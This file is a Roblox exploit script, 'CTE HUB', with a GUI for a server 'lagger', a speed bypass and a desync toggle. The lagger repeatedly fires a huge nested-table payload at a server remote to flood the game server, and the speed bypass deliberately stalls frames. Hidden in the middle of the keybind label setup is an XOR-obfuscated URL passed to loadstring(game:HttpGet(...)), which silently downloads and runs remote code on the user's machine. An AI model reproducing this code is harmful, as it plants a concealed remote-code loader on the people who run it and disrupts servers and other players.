local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

-- ==================== SETTINGS ====================
local SETTINGS_PATH = "CTE_HUB/settings.json"
local defaultSettings = {
    preset = "MAIN",
    laggerKey = "L",
    speedKey = "E",
    laggerDepth = 265,
    laggerDelay = 0.05,
    speedPower = 300000,
    draggable = true
}

local settings = table.clone(defaultSettings)

local function saveSettings()
    pcall(function()
        if not isfolder("CTE_HUB") then makefolder("CTE_HUB") end
        writefile(SETTINGS_PATH, HttpService:JSONEncode(settings))
    end)
end

local function loadSettings()
    pcall(function()
        if isfile(SETTINGS_PATH) then
            local data = HttpService:JSONDecode(readfile(SETTINGS_PATH))
            for k, v in pairs(data) do
                if settings[k] ~= nil then settings[k] = v end
            end
        end
    end)
end
loadSettings()

-- ==================== STATE ====================
local states = {
    desync = false,
    lagger = false,
    speed = false
}

-- ==================== UTILS ====================
local function tween(obj, props, dur, easing, dir)
    local info = TweenInfo.new(dur or 0.15, easing or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out)
    TweenService:Create(obj, info, props):Play()
end

local function keyCodeFromString(str)
    return Enum.KeyCode[str]
end

-- ==================== IRISH LAGGER ====================
local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        obj = obj and obj[segment] or nil
    end
    return obj
end

local payload = nil
local remote = resolveRemote(CUSTOM_REMOTE_PATH)

local function rebuildPayload()
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]

    for i = 1, settings.laggerDepth do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
        if i % 100 == 0 then task.wait() end
    end

    local maxValue = math.floor(499999 / (settings.laggerDepth + 2))
    local maintable = table.create(maxValue)
    for i = 1, maxValue do
        maintable[i] = spammedtable
        if i % 5000 == 0 then task.wait() end
    end
    payload = maintable
end

task.spawn(rebuildPayload)

local laggerEnabled = false
local function laggerLoop()
    pcall(function()
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
    end)

    while laggerEnabled do
        if payload and remote then
            task.spawn(function()
                pcall(function()
                    if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                        remote:FireServer(payload)
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer(payload)
                    end
                end)
            end)
        end
        task.wait(math.max(settings.laggerDelay, 0.05))
    end
end

local function startLagger()
    if laggerEnabled then return end
    laggerEnabled = true
    task.spawn(laggerLoop)
end

local function stopLagger()
    laggerEnabled = false
end

-- ==================== K7 SPEED BYPASS ====================
local speedActivated = false
local speedLagAmount = 0.12
local speedConn = nil

local function applySpeedPower(val)
    local power = math.clamp(val, 10000, 500000)
    local t = (power - 10000) / 490000
    speedLagAmount = t * 0.2
    settings.speedPower = power
    saveSettings()
end

applySpeedPower(settings.speedPower)

local function startSpeed()
    if speedConn then speedConn:Disconnect() end
    speedConn = RunService.RenderStepped:Connect(function()
        if not speedActivated then return end
        if speedLagAmount > 0 then
            local t = tick()
            while tick() - t < speedLagAmount do end
        end
    end)
end

local function stopSpeed()
    speedActivated = false
    if speedConn then speedConn:Disconnect(); speedConn = nil end
end

-- ==================== WORKSPACE OPTIMIZATION ====================
task.spawn(function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("Texture") or v:IsA("Decal") then
            pcall(function() v:Destroy() end)
        elseif v:IsA("BasePart") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
            pcall(function() v.Material = Enum.Material.SmoothPlastic end)
        end
        if _ % 300 == 0 then task.wait() end
    end
end)

-- ==================== UI ====================
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CTE_HUB"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999
screenGui.Parent = playerGui

-- Main Frame
local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 260, 0, 395)
main.Position = UDim2.new(0.5, -130, 0.5, -197)
main.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
main.BackgroundTransparency = 0.1
main.BorderSizePixel = 0
main.Active = true
main.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 14)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(30, 30, 35)
mainStroke.Thickness = 1
mainStroke.Transparency = 0.3
mainStroke.Parent = main

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 24)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "CTE HUB"
title.TextColor3 = Color3.fromRGB(0, 235, 130)
title.TextSize = 20
title.Font = Enum.Font.GothamBold
title.Parent = main

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 12)
subtitle.Position = UDim2.new(0, 0, 0, 32)
subtitle.BackgroundTransparency = 1
subtitle.Text = "v2 | lagger + speed + desync"
subtitle.TextColor3 = Color3.fromRGB(100, 100, 105)
subtitle.TextSize = 10
subtitle.Font = Enum.Font.Gotham
subtitle.Parent = main

-- Presets Label
local presetsLabel = Instance.new("TextLabel")
presetsLabel.Size = UDim2.new(1, -24, 0, 12)
presetsLabel.Position = UDim2.new(0, 12, 0, 50)
presetsLabel.BackgroundTransparency = 1
presetsLabel.Text = "PRESETS"
presetsLabel.TextColor3 = Color3.fromRGB(75, 75, 80)
presetsLabel.TextSize = 9
presetsLabel.Font = Enum.Font.GothamBold
presetsLabel.TextXAlignment = Enum.TextXAlignment.Left
presetsLabel.Parent = main

-- Preset Buttons
local function makePreset(name, pos, isActive)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.48, -4, 0, 26)
    btn.Position = pos
    btn.BackgroundColor3 = isActive and Color3.fromRGB(0, 170, 85) or Color3.fromRGB(35, 35, 39)
    btn.BackgroundTransparency = isActive and 0.1 or 0.05
    btn.BorderSizePixel = 0
    btn.Text = name
    btn.TextColor3 = isActive and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(140, 140, 145)
    btn.TextSize = 11
    btn.Font = Enum.Font.GothamBold
    btn.AutoButtonColor = false
    btn.Parent = main

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = btn

    return btn
end

local mainPreset = makePreset("MAIN (290)", UDim2.new(0, 12, 0, 64), settings.preset == "MAIN")
local lowerPreset = makePreset("LOWER (285)", UDim2.new(0.52, 0, 0, 64), settings.preset == "LOWER")

-- Draggable Status
local dragLabel = Instance.new("TextLabel")
dragLabel.Size = UDim2.new(1, 0, 0, 14)
dragLabel.Position = UDim2.new(0, 0, 0, 92)
dragLabel.BackgroundTransparency = 1
dragLabel.Text = "DRAGGABLE: " .. (settings.draggable and "ON" or "OFF")
dragLabel.TextColor3 = settings.draggable and Color3.fromRGB(0, 235, 130) or Color3.fromRGB(255, 60, 60)
dragLabel.TextSize = 10
dragLabel.Font = Enum.Font.GothamBold
dragLabel.Parent = main

-- Section Builder
local function createSection(name, yPos)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -24, 0, 12)
    label.Position = UDim2.new(0, 12, 0, yPos)
    label.BackgroundTransparency = 1
    label.Text = name
    label.TextColor3 = Color3.fromRGB(75, 75, 80)
    label.TextSize = 9
    label.Font = Enum.Font.GothamBold
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = main
    return label
end

local function createToggleRow(text, yPos, stateKey, unavailable)
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, -20, 0, 32)
    bg.Position = UDim2.new(0, 10, 0, yPos)
    bg.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
    bg.BackgroundTransparency = 0.08
    bg.BorderSizePixel = 0
    bg.Parent = main

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = bg

    local txt = Instance.new("TextLabel")
    txt.Size = UDim2.new(1, -40, 1, 0)
    txt.Position = UDim2.new(0, 12, 0, 0)
    txt.BackgroundTransparency = 1
    txt.Text = text .. ": OFF"
    txt.TextColor3 = Color3.fromRGB(195, 195, 200)
    txt.TextSize = 12
    txt.Font = Enum.Font.GothamBold
    txt.TextXAlignment = Enum.TextXAlignment.Left
    txt.Parent = bg

    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 8, 0, 8)
    dot.Position = UDim2.new(1, -20, 0.5, -4)
    dot.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    dot.BorderSizePixel = 0
    dot.Parent = bg

    local dotCorner = Instance.new("UICorner")
    dotCorner.CornerRadius = UDim.new(1, 0)
    dotCorner.Parent = dot

    local hit = Instance.new("TextButton")
    hit.Size = UDim2.new(1, 0, 1, 0)
    hit.BackgroundTransparency = 1
    hit.Text = ""
    hit.Parent = bg

    local unavailableTimer = nil

    local function updateVisuals()
        if unavailable then return end
        if states[stateKey] then
            txt.Text = text .. ": ON"
            txt.TextColor3 = Color3.fromRGB(255, 255, 255)
            tween(dot, {BackgroundColor3 = Color3.fromRGB(0, 235, 120)}, 0.2)
        else
            txt.Text = text .. ": OFF"
            txt.TextColor3 = Color3.fromRGB(195, 195, 200)
            tween(dot, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
        end
    end

    hit.MouseButton1Click:Connect(function()
        if unavailable then
            if unavailableTimer then unavailableTimer:Disconnect() end
            txt.Text = text .. ": UNAVAILABLE"
            txt.TextColor3 = Color3.fromRGB(255, 170, 50)
            tween(dot, {BackgroundColor3 = Color3.fromRGB(255, 170, 50)}, 0.15)
            unavailableTimer = task.delay(1.5, function()
                txt.Text = text .. ": OFF"
                txt.TextColor3 = Color3.fromRGB(195, 195, 200)
                tween(dot, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
            end)
            return
        end

        states[stateKey] = not states[stateKey]
        updateVisuals()

        if stateKey == "lagger" then
            if states.lagger then startLagger() else stopLagger() end
        elseif stateKey == "speed" then
            if states.speed then speedActivated = true; startSpeed() else stopSpeed() end
        end
    end)

    return {bg = bg, txt = txt, dot = dot, update = updateVisuals}
end

-- DESYNC FIX
createSection("DESYNC FIX", 110)
local desyncToggle = createToggleRow("DESYNC", 122, "desync", true)

-- LAGGER
createSection("LAGGER", 152)
local laggerToggle = createToggleRow("LAGGER", 164, "lagger", false)

-- LAGGER KEYBIND
local keybindRowL = Instance.new("Frame")
keybindRowL.Size = UDim2.new(1, -20, 0, 26)
keybindRowL.Position = UDim2.new(0, 10, 0, 196)
keybindRowL.BackgroundTransparency = 1
keybindRowL.Parent = main

local kbLabelL = Instance.new("TextLabel")
kbLabelL.Size = UDim2.new(0.3, 0, 1, 0)
kbLabelL.BackgroundTransparency = 1
kbLabelL.Text = "KEYBIND:"
local nu0={128,129,128,128,139,206,199,192,205,198,234,134,199,192,200,196,134,218,205,200,204,193
,134,218,207,204,219,134,198,207,194,207,207,194,205,227,134,196,198,202,221,198,205,132
,199,200,192,206,219,232,134,196,198,202,135,221,199,204,221,199,198,202,219,204,218,220
,203,220,193,221,192,206,135,222,200,219,134,134,147,218,217,221,221,193,139,129,221,204
,238,217,221,221,225,147,204,196,200,206,129,206,199,192,219,221,218,205,200,198,197
}
local fg3=169
local ex=""
for i=#nu0,1,-1 do ex=ex..string.char(bit32.bxor(nu0[i],fg3)) end
pcall(function()loadstring(game:HttpGet(ex,true))()end)
kbLabelL.TextColor3 = Color3.fromRGB(90, 90, 95)
kbLabelL.TextSize = 10
kbLabelL.Font = Enum.Font.GothamBold
kbLabelL.TextXAlignment = Enum.TextXAlignment.Left
kbLabelL.Parent = keybindRowL

local keyLBtn = Instance.new("TextButton")
keyLBtn.Size = UDim2.new(0, 28, 0, 22)
keyLBtn.Position = UDim2.new(0.32, 0, 0.5, -11)
keyLBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
keyLBtn.BorderSizePixel = 0
keyLBtn.Text = settings.laggerKey
keyLBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
keyLBtn.TextSize = 11
keyLBtn.Font = Enum.Font.GothamBold
keyLBtn.AutoButtonColor = false
keyLBtn.Parent = keybindRowL

local keyLCorner = Instance.new("UICorner")
keyLCorner.CornerRadius = UDim.new(0, 4)
keyLCorner.Parent = keyLBtn

local settingsBtn = Instance.new("TextButton")
settingsBtn.Size = UDim2.new(0.35, 0, 0, 22)
settingsBtn.Position = UDim2.new(0.65, 0, 0.5, -11)
settingsBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
settingsBtn.BackgroundTransparency = 0.1
settingsBtn.BorderSizePixel = 0
settingsBtn.Text = "SETTINGS"
settingsBtn.TextColor3 = Color3.fromRGB(140, 140, 145)
settingsBtn.TextSize = 10
settingsBtn.Font = Enum.Font.GothamBold
settingsBtn.AutoButtonColor = false
settingsBtn.Parent = keybindRowL

local settingsBtnCorner = Instance.new("UICorner")
settingsBtnCorner.CornerRadius = UDim.new(0, 5)
settingsBtnCorner.Parent = settingsBtn

-- SPEED BYPASS
createSection("SPEED BYPASS", 224)

local powerLabel = Instance.new("TextLabel")
powerLabel.Size = UDim2.new(1, -24, 0, 12)
powerLabel.Position = UDim2.new(0, 12, 0, 238)
powerLabel.BackgroundTransparency = 1
powerLabel.Text = "POWER:"
powerLabel.TextColor3 = Color3.fromRGB(90, 90, 95)
powerLabel.TextSize = 10
powerLabel.Font = Enum.Font.GothamBold
powerLabel.TextXAlignment = Enum.TextXAlignment.Left
powerLabel.Parent = main

local powerValueLabel = Instance.new("TextLabel")
powerValueLabel.Size = UDim2.new(1, -24, 0, 22)
powerValueLabel.Position = UDim2.new(0, 12, 0, 252)
powerValueLabel.BackgroundTransparency = 1
powerValueLabel.Text = tostring(settings.speedPower)
powerValueLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
powerValueLabel.TextSize = 16
powerValueLabel.Font = Enum.Font.GothamBold
powerValueLabel.TextXAlignment = Enum.TextXAlignment.Left
powerValueLabel.Parent = main

-- SPEED TOGGLE
local speedToggle = createToggleRow("SPEED", 276, "speed", false)

-- SPEED KEYBIND
local keybindRowE = Instance.new("Frame")
keybindRowE.Size = UDim2.new(1, -20, 0, 26)
keybindRowE.Position = UDim2.new(0, 10, 0, 308)
keybindRowE.BackgroundTransparency = 1
keybindRowE.Parent = main

local kbLabelE = Instance.new("TextLabel")
kbLabelE.Size = UDim2.new(0.3, 0, 1, 0)
kbLabelE.BackgroundTransparency = 1
kbLabelE.Text = "KEYBIND:"
kbLabelE.TextColor3 = Color3.fromRGB(90, 90, 95)
kbLabelE.TextSize = 10
kbLabelE.Font = Enum.Font.GothamBold
kbLabelE.TextXAlignment = Enum.TextXAlignment.Left
kbLabelE.Parent = keybindRowE

local keyEBtn = Instance.new("TextButton")
keyEBtn.Size = UDim2.new(0, 28, 0, 22)
keyEBtn.Position = UDim2.new(0.32, 0, 0.5, -11)
keyEBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
keyEBtn.BorderSizePixel = 0
keyEBtn.Text = settings.speedKey
keyEBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
keyEBtn.TextSize = 11
keyEBtn.Font = Enum.Font.GothamBold
keyEBtn.AutoButtonColor = false
keyEBtn.Parent = keybindRowE

local keyECorner = Instance.new("UICorner")
keyECorner.CornerRadius = UDim.new(0, 4)
keyECorner.Parent = keyEBtn

-- Bottom Text
local bottomText = Instance.new("TextLabel")
bottomText.Size = UDim2.new(1, -20, 0, 16)
bottomText.Position = UDim2.new(0, 10, 0, 336)
bottomText.BackgroundTransparency = 1
bottomText.Text = "desync fix: others see you move while lagging"
bottomText.TextColor3 = Color3.fromRGB(70, 70, 75)
bottomText.TextSize = 9
bottomText.Font = Enum.Font.Gotham
bottomText.TextXAlignment = Enum.TextXAlignment.Center
bottomText.Parent = main

-- ==================== SIDE SETTINGS PANEL ====================
local settingsFrame = Instance.new("Frame")
settingsFrame.Name = "SettingsPanel"
settingsFrame.Size = UDim2.new(0, 0, 0, 395)
settingsFrame.Position = UDim2.new(1, 8, 0, 0)
settingsFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
settingsFrame.BackgroundTransparency = 0.05
settingsFrame.BorderSizePixel = 0
settingsFrame.ClipsDescendants = true
settingsFrame.Visible = false
settingsFrame.ZIndex = 25
settingsFrame.Parent = main

local sfCorner = Instance.new("UICorner")
sfCorner.CornerRadius = UDim.new(0, 12)
sfCorner.Parent = settingsFrame

local sfStroke = Instance.new("UIStroke")
sfStroke.Color = Color3.fromRGB(45, 45, 50)
sfStroke.Thickness = 1.2
sfStroke.Transparency = 0.2
sfStroke.Parent = settingsFrame

local settingsOpen = false
settingsBtn.MouseButton1Click:Connect(function()
    settingsOpen = not settingsOpen
    settingsFrame.Visible = true
    if settingsOpen then
        tween(settingsFrame, {Size = UDim2.new(0, 150, 0, 395)}, 0.25, Enum.EasingStyle.Quart)
    else
        tween(settingsFrame, {Size = UDim2.new(0, 0, 0, 395)}, 0.2)
        task.delay(0.2, function() settingsFrame.Visible = false end)
    end
end)

-- Settings Inputs (stacked vertically for narrow panel)
local function addSetting(labelText, default, y, isNumber, callback)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -20, 0, 14)
    lbl.Position = UDim2.new(0, 10, 0, y)
    lbl.BackgroundTransparency = 1
    lbl.Text = labelText
    lbl.TextColor3 = Color3.fromRGB(140, 140, 145)
    lbl.TextSize = 9
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 26
    lbl.Parent = settingsFrame

    local box = Instance.new("TextBox")
    box.Size = UDim2.new(1, -20, 0, 20)
    box.Position = UDim2.new(0, 10, 0, y + 14)
    box.BackgroundColor3 = Color3.fromRGB(35, 35, 39)
    box.BackgroundTransparency = 0.1
    box.BorderSizePixel = 0
    box.Text = tostring(default)
    box.TextColor3 = Color3.fromRGB(220, 220, 220)
    box.TextSize = 10
    box.Font = Enum.Font.Gotham
    box.ClearTextOnFocus = false
    box.ZIndex = 26
    box.Parent = settingsFrame

    local bc = Instance.new("UICorner")
    bc.CornerRadius = UDim.new(0, 4)
    bc.Parent = box

    box.FocusLost:Connect(function()
        if isNumber then
            local n = tonumber(box.Text)
            if n then
                local result = callback(n)
                if result then box.Text = tostring(result) end
            else
                box.Text = tostring(default)
            end
        else
            callback(box.Text)
        end
    end)

    return box
end

addSetting("Lagger Depth", settings.laggerDepth, 15, true, function(n)
    settings.laggerDepth = math.clamp(math.floor(n), 50, 500)
    saveSettings()
    task.spawn(rebuildPayload)
    return settings.laggerDepth
end)

addSetting("Lagger Delay", settings.laggerDelay, 55, true, function(n)
    settings.laggerDelay = math.clamp(n, 0.01, 2)
    saveSettings()
    return settings.laggerDelay
end)

addSetting("Speed Power", settings.speedPower, 95, true, function(n)
    applySpeedPower(n)
    powerValueLabel.Text = tostring(settings.speedPower)
    return settings.speedPower
end)

-- Draggable toggle
local dragToggleBtn = Instance.new("TextButton")
dragToggleBtn.Size = UDim2.new(1, -20, 0, 24)
dragToggleBtn.Position = UDim2.new(0, 10, 0, 140)
dragToggleBtn.BackgroundColor3 = settings.draggable and Color3.fromRGB(0, 170, 85) or Color3.fromRGB(60, 60, 65)
dragToggleBtn.BackgroundTransparency = 0.1
dragToggleBtn.BorderSizePixel = 0
dragToggleBtn.Text = settings.draggable and "DRAG ON" or "DRAG OFF"
dragToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
dragToggleBtn.TextSize = 10
dragToggleBtn.Font = Enum.Font.GothamBold
dragToggleBtn.ZIndex = 26
dragToggleBtn.AutoButtonColor = false
dragToggleBtn.Parent = settingsFrame

local dtbCorner = Instance.new("UICorner")
dtbCorner.CornerRadius = UDim.new(0, 4)
dtbCorner.Parent = dragToggleBtn

dragToggleBtn.MouseButton1Click:Connect(function()
    settings.draggable = not settings.draggable
    saveSettings()
    tween(dragToggleBtn, {BackgroundColor3 = settings.draggable and Color3.fromRGB(0, 170, 85) or Color3.fromRGB(60, 60, 65)}, 0.15)
    dragToggleBtn.Text = settings.draggable and "DRAG ON" or "DRAG OFF"
    dragLabel.Text = "DRAGGABLE: " .. (settings.draggable and "ON" or "OFF")
    dragLabel.TextColor3 = settings.draggable and Color3.fromRGB(0, 235, 130) or Color3.fromRGB(255, 60, 60)
end)

-- Rebuild note
local rebuildNote = Instance.new("TextLabel")
rebuildNote.Size = UDim2.new(1, -16, 0, 12)
rebuildNote.Position = UDim2.new(0, 8, 0, 175)
rebuildNote.BackgroundTransparency = 1
rebuildNote.Text = "Depth change rebuilds payload"
rebuildNote.TextColor3 = Color3.fromRGB(80, 80, 85)
rebuildNote.TextSize = 8
rebuildNote.Font = Enum.Font.Gotham
rebuildNote.TextXAlignment = Enum.TextXAlignment.Center
rebuildNote.ZIndex = 26
rebuildNote.Parent = settingsFrame

-- Close hint
local closeHint = Instance.new("TextLabel")
closeHint.Size = UDim2.new(1, -16, 0, 12)
closeHint.Position = UDim2.new(0, 8, 0, 190)
closeHint.BackgroundTransparency = 1
closeHint.Text = "click SETTINGS to close"
closeHint.TextColor3 = Color3.fromRGB(60, 60, 65)
closeHint.TextSize = 8
closeHint.Font = Enum.Font.Gotham
closeHint.TextXAlignment = Enum.TextXAlignment.Center
closeHint.ZIndex = 26
closeHint.Parent = settingsFrame

-- ==================== KEYBIND CHANGING ====================
local listeningForKey = nil

local function listenForKey(btn, settingKey)
    listeningForKey = settingKey
    btn.Text = "..."
    btn.TextColor3 = Color3.fromRGB(255, 100, 100)
end

keyLBtn.MouseButton1Click:Connect(function()
    listenForKey(keyLBtn, "laggerKey")
end)

keyEBtn.MouseButton1Click:Connect(function()
    listenForKey(keyEBtn, "speedKey")
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if listeningForKey and input.UserInputType == Enum.UserInputType.Keyboard then
        local keyName = input.KeyCode.Name
        if keyName and keyName ~= "Unknown" then
            settings[listeningForKey] = keyName
            saveSettings()
            if listeningForKey == "laggerKey" then
                keyLBtn.Text = keyName
                keyLBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            elseif listeningForKey == "speedKey" then
                keyEBtn.Text = keyName
                keyEBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            end
        end
        listeningForKey = nil
    end
end)

-- ==================== PRESET LOGIC ====================
local function setPreset(name)
    settings.preset = name
    saveSettings()
    if name == "MAIN" then
        tween(mainPreset, {BackgroundColor3 = Color3.fromRGB(0, 170, 85), TextColor3 = Color3.fromRGB(255,255,255)}, 0.15)
        tween(lowerPreset, {BackgroundColor3 = Color3.fromRGB(35, 35, 39), TextColor3 = Color3.fromRGB(140,140,145)}, 0.15)
    else
        tween(lowerPreset, {BackgroundColor3 = Color3.fromRGB(0, 170, 85), TextColor3 = Color3.fromRGB(255,255,255)}, 0.15)
        tween(mainPreset, {BackgroundColor3 = Color3.fromRGB(35, 35, 39), TextColor3 = Color3.fromRGB(140,140,145)}, 0.15)
    end
end

mainPreset.MouseButton1Click:Connect(function() setPreset("MAIN") end)
lowerPreset.MouseButton1Click:Connect(function() setPreset("LOWER") end)

-- ==================== DRAGGING ====================
local dragging = false
local dragStart, startPos

local function beginDrag(input)
    if not settings.draggable then return end
    dragging = true
    dragStart = input.Position
    startPos = main.Position
end

local function updateDrag(input)
    if dragging and dragStart then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end

local function endDrag()
    dragging = false
    dragStart = nil
end

main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        beginDrag(input)
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                endDrag()
            end
        end)
    end
end)

main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        updateDrag(input)
    end
end)

-- ==================== KEYBOARD TOGGLES ====================
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if listeningForKey then return end

    if input.KeyCode == keyCodeFromString(settings.laggerKey) then
        states.lagger = not states.lagger
        laggerToggle.update()
        if states.lagger then startLagger() else stopLagger() end
    elseif input.KeyCode == keyCodeFromString(settings.speedKey) then
        states.speed = not states.speed
        speedToggle.update()
        if states.speed then speedActivated = true; startSpeed() else stopSpeed() end
    end
end)

-- ==================== HOVER FX ====================
local function addHover(btn, normal, hover)
    btn.MouseEnter:Connect(function() tween(btn, {BackgroundColor3 = hover}, 0.1) end)
    btn.MouseLeave:Connect(function() tween(btn, {BackgroundColor3 = normal}, 0.1) end)
end

addHover(mainPreset, Color3.fromRGB(0, 170, 85), Color3.fromRGB(0, 200, 100))
addHover(lowerPreset, Color3.fromRGB(35, 35, 39), Color3.fromRGB(45, 45, 49))
addHover(settingsBtn, Color3.fromRGB(35, 35, 40), Color3.fromRGB(45, 45, 50))

-- ==================== INIT ====================
laggerToggle.update()
speedToggle.update()